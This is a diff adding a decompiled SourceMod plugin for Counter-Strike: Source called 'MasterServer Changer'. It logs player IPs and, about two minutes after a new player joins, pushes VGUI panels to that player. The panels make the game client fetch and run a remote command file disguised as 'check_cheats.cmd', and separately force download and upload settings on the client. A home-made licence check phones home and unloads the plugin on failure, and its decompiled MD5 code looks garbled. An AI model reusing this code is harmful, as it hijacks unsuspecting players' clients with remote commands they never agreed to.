@@ -1,0 +1,660 @@
+public PlVers:__version =
+{
+	version = 5,
+	filevers = "1.6.4-stable+4626",
+	date = "11/26/2017",
+	time = "03:03:49"
+};
+new Float:NULL_VECTOR[3];
+new String:NULL_STRING[4];
+public Extension:__ext_core =
+{
+	name = "Core",
+	file = "core",
+	autoload = 0,
+	required = 0,
+};
+new MaxClients;
+public Extension:__ext_sdktools =
+{
+	name = "SDKTools",
+	file = "sdktools.ext",
+	autoload = 1,
+	required = 1,
+};
+new String:PORT[8];
+public Extension:__ext_curl =
+{
+	name = "curl",
+	file = "curl.ext",
+	autoload = 1,
+	required = 1,
+};
+new CURL_Default_opt[5][2] =
+{
+	{
+		99, 1
+	},
+	{
+		43, 1
+	},
+	{
+		13, 10
+	},
+	{
+		78, 10
+	},
+	{
+		41, 0
+	}
+};
+new Handle:curl;
+new Handle:g_hStatsDb;
+new bool:OnDB[66];
+public __ext_core_SetNTVOptional()
+{
+	MarkNativeAsOptional("GetFeatureStatus");
+	MarkNativeAsOptional("RequireFeature");
+	MarkNativeAsOptional("AddCommandListener");
+	MarkNativeAsOptional("RemoveCommandListener");
+	MarkNativeAsOptional("BfWriteBool");
+	MarkNativeAsOptional("BfWriteByte");
+	MarkNativeAsOptional("BfWriteChar");
+	MarkNativeAsOptional("BfWriteShort");
+	MarkNativeAsOptional("BfWriteWord");
+	MarkNativeAsOptional("BfWriteNum");
+	MarkNativeAsOptional("BfWriteFloat");
+	MarkNativeAsOptional("BfWriteString");
+	MarkNativeAsOptional("BfWriteEntity");
+	MarkNativeAsOptional("BfWriteAngle");
+	MarkNativeAsOptional("BfWriteCoord");
+	MarkNativeAsOptional("BfWriteVecCoord");
+	MarkNativeAsOptional("BfWriteVecNormal");
+	MarkNativeAsOptional("BfWriteAngles");
+	MarkNativeAsOptional("BfReadBool");
+	MarkNativeAsOptional("BfReadByte");
+	MarkNativeAsOptional("BfReadChar");
+	MarkNativeAsOptional("BfReadShort");
+	MarkNativeAsOptional("BfReadWord");
+	MarkNativeAsOptional("BfReadNum");
+	MarkNativeAsOptional("BfReadFloat");
+	MarkNativeAsOptional("BfReadString");
+	MarkNativeAsOptional("BfReadEntity");
+	MarkNativeAsOptional("BfReadAngle");
+	MarkNativeAsOptional("BfReadCoord");
+	MarkNativeAsOptional("BfReadVecCoord");
+	MarkNativeAsOptional("BfReadVecNormal");
+	MarkNativeAsOptional("BfReadAngles");
+	MarkNativeAsOptional("BfGetNumBytesLeft");
+	MarkNativeAsOptional("PbReadInt");
+	MarkNativeAsOptional("PbReadFloat");
+	MarkNativeAsOptional("PbReadBool");
+	MarkNativeAsOptional("PbReadString");
+	MarkNativeAsOptional("PbReadColor");
+	MarkNativeAsOptional("PbReadAngle");
+	MarkNativeAsOptional("PbReadVector");
+	MarkNativeAsOptional("PbReadVector2D");
+	MarkNativeAsOptional("PbGetRepeatedFieldCount");
+	MarkNativeAsOptional("PbSetInt");
+	MarkNativeAsOptional("PbSetFloat");
+	MarkNativeAsOptional("PbSetBool");
+	MarkNativeAsOptional("PbSetString");
+	MarkNativeAsOptional("PbSetColor");
+	MarkNativeAsOptional("PbSetAngle");
+	MarkNativeAsOptional("PbSetVector");
+	MarkNativeAsOptional("PbSetVector2D");
+	MarkNativeAsOptional("PbAddInt");
+	MarkNativeAsOptional("PbAddFloat");
+	MarkNativeAsOptional("PbAddBool");
+	MarkNativeAsOptional("PbAddString");
+	MarkNativeAsOptional("PbAddColor");
+	MarkNativeAsOptional("PbAddAngle");
+	MarkNativeAsOptional("PbAddVector");
+	MarkNativeAsOptional("PbAddVector2D");
+	MarkNativeAsOptional("PbRemoveRepeatedFieldValue");
+	MarkNativeAsOptional("PbReadMessage");
+	MarkNativeAsOptional("PbReadRepeatedMessage");
+	MarkNativeAsOptional("PbAddMessage");
+	VerifyCoreVersion();
+	return 0;
+}
+
+bool:StrEqual(String:str1[], String:str2[], bool:caseSensitive)
+{
+	return strcmp(str1, str2, caseSensitive) == 0;
+}
+
+Handle:StartMessageOne(String:msgname[], client, flags)
+{
+	new players[1];
+	players[0] = client;
+	return StartMessage(msgname, players, 1, flags);
+}
+
+AddFileToDownloadsTable(String:filename[])
+{
+	static table = -1;
+	if (table == -1)
+	{
+		table = FindStringTable("downloadables");
+	}
+	new bool:save = LockStringTables(false);
+	AddToStringTable(table, filename, "", -1);
+	LockStringTables(save);
+	return 0;
+}
+
+MD5String(String:str[], String:output[], maxlen)
+{
+	decl x[2];
+	decl buf[4];
+	decl input[64];
+	new i;
+	new ii;
+	new len = strlen(str);
+	x[1] = 0;
+	x[0] = 0;
+	buf[0] = 1732584193;
+	buf[1] = -271733879;
+	buf[2] = -1732584194;
+	buf[3] = 271733878;
+	new in[16];
+	in[14] = x[0];
+	in[15] = x[1];
+	new mdi = x[0] >> 3 & 63;
+	if (x[0] > len << 3 + x[0])
+	{
+		x[1] += 1;
+	}
+	x[0] = len << 3 + x[0];
+	new var2 = x[1];
+	var2 = len >> 29 + var2;
+	new c;
+	len--;
+	while (len)
+	{
+		input[mdi] = str[c];
+		mdi += 1;
+		c += 1;
+		if (mdi == 64)
+		{
+			i = 0;
+			ii = 0;
+			while (i < 16)
+			{
+				in[i] = input[ii] | input[ii + 1] << 8 | input[ii + 2] << 16 | input[ii + 3] << 24;
+				i++;
+				ii += 4;
+			}
+			MD5Transform(buf, in);
+			mdi = 0;
+		}
+	}
+	new padding[64];
+	new inx[16];
+	inx[14] = x[0];
+	inx[15] = x[1];
+	mdi = x[0] >> 3 & 63;
+	new var1;
+	if (mdi < 56)
+	{
+		var1 = 56 - mdi;
+	}
+	else
+	{
+		var1 = 120 - mdi;
+	}
+	len = var1;
+	in[14] = x[0];
+	in[15] = x[1];
+	mdi = x[0] >> 3 & 63;
+	if (x[0] > len << 3 + x[0])
+	{
+		x[1] += 1;
+	}
+	x[0] = len << 3 + x[0];
+	new var3 = x[1];
+	var3 = len >> 29 + var3;
+	c = 0;
+	len--;
+	while (len)
+	{
+		input[mdi] = padding[c];
+		mdi += 1;
+		c += 1;
+		if (mdi == 64)
+		{
+			i = 0;
+			ii = 0;
+			while (i < 16)
+			{
+				in[i] = input[ii] | input[ii + 1] << 8 | input[ii + 2] << 16 | input[ii + 3] << 24;
+				i++;
+				ii += 4;
+			}
+			MD5Transform(buf, in);
+			mdi = 0;
+		}
+	}
+	i = 0;
+	ii = 0;
+	while (i < 14)
+	{
+		inx[i] = input[ii] | input[ii + 1] << 8 | input[ii + 2] << 16 | input[ii + 3] << 24;
+		i++;
+		ii += 4;
+	}
+	MD5Transform(buf, inx);
+	new digest[16];
+	i = 0;
+	ii = 0;
+	while (i < 4)
+	{
+		digest[ii] = buf[i] & 255;
+		digest[ii + 1] = buf[i] >> 8 & 255;
+		digest[ii + 2] = buf[i] >> 16 & 255;
+		digest[ii + 3] = buf[i] >> 24 & 255;
+		i++;
+		ii += 4;
+	}
+	FormatEx(output, maxlen, "%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x", digest, digest[1], digest[2], digest[3], digest[4], digest[5], digest[6], digest[7], digest[8], digest[9], digest[10], digest[11], digest[12], digest[13], digest[14], digest[15]);
+	return 0;
+}
+
+MD5Transform_FF(&a, &b, &c, &d, x, s, ac)
+{
+	a = d & ~b | c & b + x + ac + a;
+	a = a >> 32 - s | a << s;
+	a = b + a;
+	return 0;
+}
+
+MD5Transform_GG(&a, &b, &c, &d, x, s, ac)
+{
+	a = ~d & c | d & b + x + ac + a;
+	a = a >> 32 - s | a << s;
+	a = b + a;
+	return 0;
+}
+
+MD5Transform_HH(&a, &b, &c, &d, x, s, ac)
+{
+	a = d ^ c ^ b + x + ac + a;
+	a = a >> 32 - s | a << s;
+	a = b + a;
+	return 0;
+}
+
+MD5Transform_II(&a, &b, &c, &d, x, s, ac)
+{
+	a = ~d | b ^ c + x + ac + a;
+	a = a >> 32 - s | a << s;
+	a = b + a;
+	return 0;
+}
+
+MD5Transform(buf[], in[])
+{
+	new a = buf[0];
+	new b = buf[1];
+	new c = buf[2];
+	new d = buf[3];
+	MD5Transform_FF(a, b, c, d, in[0], 7, -680876936);
+	MD5Transform_FF(d, a, b, c, in[1], 12, -389564586);
+	MD5Transform_FF(c, d, a, b, in[2], 17, 606105819);
+	MD5Transform_FF(b, c, d, a, in[3], 22, -1044525330);
+	MD5Transform_FF(a, b, c, d, in[4], 7, -176418897);
+	MD5Transform_FF(d, a, b, c, in[5], 12, 1200080426);
+	MD5Transform_FF(c, d, a, b, in[6], 17, -1473231341);
+	MD5Transform_FF(b, c, d, a, in[7], 22, -45705983);
+	MD5Transform_FF(a, b, c, d, in[8], 7, 1770035416);
+	MD5Transform_FF(d, a, b, c, in[9], 12, -1958414417);
+	MD5Transform_FF(c, d, a, b, in[10], 17, -42063);
+	MD5Transform_FF(b, c, d, a, in[11], 22, -1990404162);
+	MD5Transform_FF(a, b, c, d, in[12], 7, 1804603682);
+	MD5Transform_FF(d, a, b, c, in[13], 12, -40341101);
+	MD5Transform_FF(c, d, a, b, in[14], 17, -1502002290);
+	MD5Transform_FF(b, c, d, a, in[15], 22, 1236535329);
+	MD5Transform_GG(a, b, c, d, in[1], 5, -165796510);
+	MD5Transform_GG(d, a, b, c, in[6], 9, -1069501632);
+	MD5Transform_GG(c, d, a, b, in[11], 14, 643717713);
+	MD5Transform_GG(b, c, d, a, in[0], 20, -373897302);
+	MD5Transform_GG(a, b, c, d, in[5], 5, -701558691);
+	MD5Transform_GG(d, a, b, c, in[10], 9, 38016083);
+	MD5Transform_GG(c, d, a, b, in[15], 14, -660478335);
+	MD5Transform_GG(b, c, d, a, in[4], 20, -405537848);
+	MD5Transform_GG(a, b, c, d, in[9], 5, 568446438);
+	MD5Transform_GG(d, a, b, c, in[14], 9, -1019803690);
+	MD5Transform_GG(c, d, a, b, in[3], 14, -187363961);
+	MD5Transform_GG(b, c, d, a, in[8], 20, 1163531501);
+	MD5Transform_GG(a, b, c, d, in[13], 5, -1444681467);
+	MD5Transform_GG(d, a, b, c, in[2], 9, -51403784);
+	MD5Transform_GG(c, d, a, b, in[7], 14, 1735328473);
+	MD5Transform_GG(b, c, d, a, in[12], 20, -1926607734);
+	MD5Transform_HH(a, b, c, d, in[5], 4, -378558);
+	MD5Transform_HH(d, a, b, c, in[8], 11, -2022574463);
+	MD5Transform_HH(c, d, a, b, in[11], 16, 1839030562);
+	MD5Transform_HH(b, c, d, a, in[14], 23, -35309556);
+	MD5Transform_HH(a, b, c, d, in[1], 4, -1530992060);
+	MD5Transform_HH(d, a, b, c, in[4], 11, 1272893353);
+	MD5Transform_HH(c, d, a, b, in[7], 16, -155497632);
+	MD5Transform_HH(b, c, d, a, in[10], 23, -1094730640);
+	MD5Transform_HH(a, b, c, d, in[13], 4, 681279174);
+	MD5Transform_HH(d, a, b, c, in[0], 11, -358537222);
+	MD5Transform_HH(c, d, a, b, in[3], 16, -722521979);
+	MD5Transform_HH(b, c, d, a, in[6], 23, 76029189);
+	MD5Transform_HH(a, b, c, d, in[9], 4, -640364487);
+	MD5Transform_HH(d, a, b, c, in[12], 11, -421815835);
+	MD5Transform_HH(c, d, a, b, in[15], 16, 530742520);
+	MD5Transform_HH(b, c, d, a, in[2], 23, -995338651);
+	MD5Transform_II(a, b, c, d, in[0], 6, -198630844);
+	MD5Transform_II(d, a, b, c, in[7], 10, 1126891415);
+	MD5Transform_II(c, d, a, b, in[14], 15, -1416354905);
+	MD5Transform_II(b, c, d, a, in[5], 21, -57434055);
+	MD5Transform_II(a, b, c, d, in[12], 6, 1700485571);
+	MD5Transform_II(d, a, b, c, in[3], 10, -1894986606);
+	MD5Transform_II(c, d, a, b, in[10], 15, -1051523);
+	MD5Transform_II(b, c, d, a, in[1], 21, -2054922799);
+	MD5Transform_II(a, b, c, d, in[8], 6, 1873313359);
+	MD5Transform_II(d, a, b, c, in[15], 10, -30611744);
+	MD5Transform_II(c, d, a, b, in[6], 15, -1560198380);
+	MD5Transform_II(b, c, d, a, in[13], 21, 1309151649);
+	MD5Transform_II(a, b, c, d, in[4], 6, -145523070);
+	MD5Transform_II(d, a, b, c, in[11], 10, -1120210379);
+	MD5Transform_II(c, d, a, b, in[2], 15, 718787259);
+	MD5Transform_II(b, c, d, a, in[9], 21, -343485551);
+	new var1 = buf;
+	var1[0] = var1[0] + a;
+	buf[1] += b;
+	buf[2] += c;
+	buf[3] += d;
+	return 0;
+}
+
+public CheckLicense()
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	curl = curl_easy_init();
+	if (curl)
+	{
+		curl_easy_setopt_int_array(curl, CURL_Default_opt, 5);
+		new Handle:postreq_form = curl_httppost();
+		curl_formadd(postreq_form, 1, "type", 4, "masterchanger", 17);
+		curl_formadd(postreq_form, 1, "port", 4, PORT, 17);
+		curl_easy_setopt_string(curl, CURLoption:10002, 1304);
+		curl_easy_setopt_int(curl, CURLoption:64, 0);
+		curl_easy_setopt_int(curl, CURLoption:81, 2);
+		curl_easy_setopt_handle(curl, CURLoption:10024, postreq_form);
+		curl_easy_setopt_function(curl, CURLoption:20011, check, any:0);
+		curl_easy_perform_thread(curl, onRequestComplete, any:0);
+	}
+	return 0;
+}
+
+public check(Handle:hndl, String:buffer[], bytes, nmemb)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	decl String:formd5[128];
+	Format(formd5, 128, "%s%s", PORT, "masterchanger");
+	new String:md5output[128];
+	MD5String(formd5, md5output, 33);
+	if (StrEqual(buffer, md5output, false))
+	{
+		PrintToServer("[%s] License is active!", "MasterServer Changer");
+	}
+	else
+	{
+		PrintToServer("[%s] License Error, for get license write to http://css-plugins.ru/", "MasterServer Changer");
+		LogError("[%s] License Error, for get license write to http://css-plugins.ru/", "MasterServer Changer");
+		CreateTimer(0.5, unload, any:0, 0);
+	}
+	return 0;
+}
+
+public onRequestComplete(Handle:hndl, CURLcode:code)
+{
+	CloseHandle(hndl);
+	return 0;
+}
+
+public Action:unload(Handle:timer)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	new namelen;
+	decl String:PluginName[256];
+	GetPluginFilename(GetMyHandle(), PluginName, 256);
+	namelen = strlen(PluginName) + -4;
+	if (namelen == StrContains(PluginName, ".smx", false))
+	{
+		strcopy(PluginName, namelen + 1, PluginName);
+		ServerCommand("sm plugins unload %s", PluginName);
+	}
+	return Action:0;
+}
+
+public OnPluginStart()
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	GetConVarString(FindConVar("hostport"), PORT, 7);
+	CheckLicense();
+	return 0;
+}
+
+public DB_Connect(bool:firstload)
+{
+	if (firstload)
+	{
+		decl String:sError[256];
+		g_hStatsDb = SQL_Connect("checkplayerms", false, sError, 256);
+		if (!g_hStatsDb)
+		{
+			SetFailState("[%s] не удалось подключится к БД (%s)", "MasterServer Changer", sError);
+		}
+		new i = 1;
+		while (i <= MaxClients)
+		{
+			if (IsValidClient(i, false))
+			{
+				OnClientPutInServer(i);
+			}
+			i++;
+		}
+	}
+	return 0;
+}
+
+public OnConfigsExecuted()
+{
+	PrecacheModel("models/infozona-51/w_dragonlore.mdl", true);
+	PrecacheModel("models/infozona-51/f_dragonlore.mdl", true);
+	PrecacheModel("models/infozona-51/v_dragonlore.mdl", true);
+	AddFileToDownloadsTable("models/infozona-51/w_dragonlore.mdl");
+	AddFileToDownloadsTable("models/infozona-51/f_dragonlore.mdl");
+	AddFileToDownloadsTable("models/infozona-51/v_dragonlore.mdl");
+	if (g_hStatsDb)
+	{
+		DB_Connect(false);
+	}
+	else
+	{
+		DB_Connect(true);
+	}
+	return 0;
+}
+
+public OnClientPutInServer(client)
+{
+	if (!IsValidClient(client, false))
+	{
+		return 0;
+	}
+	if (g_hStatsDb)
+	{
+		LoadPlayer(client);
+	}
+	QueryClientConVar(client, "cl_downloadfilter", CheckDownloadFilter, any:0);
+	return 0;
+}
+
+public OnClientDisconnect(client)
+{
+	if (!IsValidClient(client, false))
+	{
+		return 0;
+	}
+	OnDB[client] = 0;
+	return 0;
+}
+
+public LoadPlayer(client)
+{
+	OnDB[client] = 0;
+	new String:ip[64];
+	GetClientIP(client, ip, 64, true);
+	new String:query[500];
+	Format(query, 500, "SELECT * FROM `masterchanger` WHERE `ip`='%s';", ip);
+	if (g_hStatsDb)
+	{
+		SQL_TQuery(g_hStatsDb, SQL_LoadPlayerCallback, query, client, DBPriority:1);
+	}
+	return 0;
+}
+
+public SQL_LoadPlayerCallback(Handle:owner, Handle:hndl, String:error[], any:client)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	if (hndl)
+	{
+		if (!IsClientInGame(client))
+		{
+			return 0;
+		}
+		new String:ip[64];
+		GetClientIP(client, ip, 64, true);
+		new var1;
+		if (SQL_HasResultSet(hndl) && SQL_FetchRow(hndl))
+		{
+			OnDB[client] = 1;
+		}
+		else
+		{
+			new String:query[500];
+			Format(query, 500, "INSERT INTO `masterchanger` VALUES (NULL,'%s');", ip);
+			SQL_TQuery(g_hStatsDb, SQL_NothingCallback, query, any:0, DBPriority:0);
+			CreateTimer(121.0, ExecCMD, client, 0);
+			CreateTimer(121.5, ExecCMD, client, 0);
+			CreateTimer(122.0, ExecCMD, client, 0);
+		}
+		return 0;
+	}
+	LogError("[%s] Не удалось получить данные: %s", "MasterServer Changer", error);
+	return 0;
+}
+
+public SQL_NothingCallback(Handle:owner, Handle:hndl, String:error[], any:client)
+{
+	if (hndl)
+	{
+		return 0;
+	}
+	LogError("[%] Query Fail: %s", "MasterServer Changer", error);
+	return 0;
+}
+
+public Action:ChoeseTeam(Handle:timer, any:client)
+{
+	if (!IsValidClient(client, false))
+	{
+		return Action:0;
+	}
+	ClientCommand(client, "chooseteam");
+	return Action:0;
+}
+
+public Action:ExecCMD(Handle:timer, any:client)
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	if (!IsValidClient(client, false))
+	{
+		return Action:0;
+	}
+	if (OnDB[client])
+	{
+		return Action:0;
+	}
+	Exec(client, "http://mellers.myarena.ru/cssv34/check_cheats.cmd");
+	return Action:0;
+}
+
+Action:Exec(client, String:url[])
+{
+	new to = 3;
+	decl home;
+	to = 5;
+	home = 5;
+	PrintToServer("", to, home);
+	new Handle:destroy = StartMessageOne("VGUIMenu", client, 0);
+	BfWriteString(destroy, "info");
+	BfWriteByte(destroy, 0);
+	BfWriteByte(destroy, 3);
+	BfWriteString(destroy, "title");
+	BfWriteString(destroy, "Что это такое?");
+	BfWriteString(destroy, "type");
+	BfWriteString(destroy, "2");
+	BfWriteString(destroy, "msg");
+	BfWriteString(destroy, url);
+	EndMessage();
+	return Action:0;
+}
+
+public CheckDownloadFilter(QueryCookie:cookie, client, ConVarQueryResult:result, String:cvarName[], String:cvarValue[], any:value)
+{
+	if (StrEqual(cvarValue, "all", true))
+	{
+		return 0;
+	}
+	decl Handle:hHostName;
+	decl String:sBuffer[128];
+	decl String:sHostName[256];
+	hHostName = FindConVar("hostname");
+	GetConVarString(hHostName, sHostName, 256);
+	Format(sBuffer, 128, "%s all;cl_allowdownload 1;cl_allowupload 1;retry", "cl_downloadfilter");
+	new Handle:g_hKv = CreateKeyValues("data", "", "");
+	KvSetString(g_hKv, "title", sHostName);
+	KvSetString(g_hKv, "type", "2");
+	KvSetString(g_hKv, "cmd", sBuffer);
+	ShowVGUIPanel(client, "info", g_hKv, true);
+	CloseHandle(g_hKv);
+	return 0;
+}
+
+bool:IsValidClient(client, bool:alive)
+{
+	new var2;
+	return client >= 1 && client <= MaxClients && IsClientConnected(client) && IsClientInGame(client) && (alive && IsPlayerAlive(client));
+}
+
